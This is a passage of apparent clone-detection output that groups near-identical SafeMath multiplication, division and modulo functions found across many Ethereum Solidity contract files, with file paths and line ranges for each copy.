<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="16" endline="23" pcid="738">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0xeb6f0cfce80e88872c441d618e3c77c184892690.sol" startline="13" endline="25" pcid="8559">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b);

    return c;
  }
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="6" endline="13" pcid="5115">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="221" endline="233" pcid="7005">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="12" endline="19" pcid="4440">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="119" endline="131" pcid="8627">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="321" endline="333" pcid="1706">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="8" endline="15" pcid="5984">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="210" endline="222" pcid="4523">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="158" endline="165" pcid="1084">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="347" endline="359" pcid="5306">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="40" endline="45" pcid="907">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="128" endline="135" pcid="7123">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b);
    return c;
  }
</source>
<source file="systems/source-code/0xa322440a7b1718a9f343c943ab140e8e62345769.sol" startline="79" endline="91" pcid="5890">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="8" endline="15" pcid="2582">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="8" endline="15" pcid="4750">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0x36Ce9629522814955bc7CE5eAC7313BDFB6AC136.sol" startline="86" endline="98" pcid="1799">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="189" endline="201" pcid="9242">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="20" endline="32" pcid="5224">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="347" endline="359" pcid="7107">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="8" endline="15" pcid="8919">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="188" endline="200" pcid="7895">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
</source>
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="117" endline="124" pcid="4816">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="347" endline="359" pcid="7564">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="137" endline="149" pcid="7870">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="188" endline="200" pcid="5796">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="187" endline="199" pcid="9088">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="188" endline="200" pcid="6392">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="107" endline="114" pcid="8979">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b);
    return c;
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="224" endline="236" pcid="7756">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
</source>
<source file="systems/source-code/0x0f0138cbf893dd5926f5f4fd944e616d04617bc3.sol" startline="4" endline="11" pcid="384">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="191" endline="203" pcid="8497">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="12" endline="19" pcid="7391">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
</class>

<class classid="13" nclones="19" nlines="3" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="212" endline="214" pcid="15">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="213" endline="215" pcid="5797">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="213" endline="215" pcid="8105">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="213" endline="215" pcid="6393">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="214" endline="216" pcid="9243">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="361" endline="363" pcid="7108">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="213" endline="215" pcid="7896">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="217" endline="219" pcid="3681">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
</source>
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="361" endline="363" pcid="507">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="212" endline="214" pcid="9089">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="246" endline="248" pcid="7006">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="249" endline="251" pcid="7757">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
</source>
<source file="systems/source-code/0xa322440a7b1718a9f343c943ab140e8e62345769.sol" startline="104" endline="106" pcid="5891">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="361" endline="363" pcid="7565">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="346" endline="348" pcid="1707">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="216" endline="218" pcid="8498">
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="235" endline="237" pcid="4524">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
</source>
<source file="systems/source-code/0x36Ce9629522814955bc7CE5eAC7313BDFB6AC136.sol" startline="133" endline="135" pcid="1801">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="361" endline="363" pcid="5307">
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
</source>
</class>

<class classid="14" nclones="19" nlines="5" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="227" endline="234" pcid="16">
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="231" endline="238" pcid="8499">
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="365" endline="375" pcid="5308">
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="228" endline="235" pcid="5798">
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="229" endline="236" pcid="9244">
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="227" endline="234" pcid="9090">
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="232" endline="239" pcid="3682">
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="228" endline="235" pcid="7897">
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
<source file="systems/source-code/0x36Ce9629522814955bc7CE5eAC7313BDFB6AC136.sol" startline="148" endline="155" pcid="1802">
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0xa322440a7b1718a9f343c943ab140e8e62345769.sol" startline="121" endline="128" pcid="5892">
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="361" endline="368" pcid="1708">
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="261" endline="268" pcid="7007">
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="365" endline="375" pcid="7109">
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="230" endline="237" pcid="8106">
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="228" endline="235" pcid="6394">
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="365" endline="375" pcid="7566">
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="250" endline="261" pcid="4525">
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="365" endline="375" pcid="508">
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="264" endline="271" pcid="7758">
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
</source>
</class>

<class classid="15" nclones="19" nlines="3" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="247" endline="249" pcid="17">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="274" endline="276" pcid="4526">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="249" endline="251" pcid="9245">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="377" endline="379" pcid="7567">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="284" endline="286" pcid="7759">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
</source>
<source file="systems/source-code/0xa322440a7b1718a9f343c943ab140e8e62345769.sol" startline="141" endline="143" pcid="5893">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="281" endline="283" pcid="7008">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="252" endline="254" pcid="3683">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="381" endline="383" pcid="1709">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="250" endline="252" pcid="8107">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="248" endline="250" pcid="7898">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="248" endline="250" pcid="5799">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="377" endline="379" pcid="7110">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="247" endline="249" pcid="9091">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
</source>
<source file="systems/source-code/0x36Ce9629522814955bc7CE5eAC7313BDFB6AC136.sol" startline="168" endline="170" pcid="1803">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="377" endline="379" pcid="5309">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
</source>
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="377" endline="379" pcid="509">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="248" endline="250" pcid="6395">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="251" endline="253" pcid="8500">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
</source>
</class>

<class classid="16" nclones="19" nlines="4" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="262" endline="265" pcid="18">
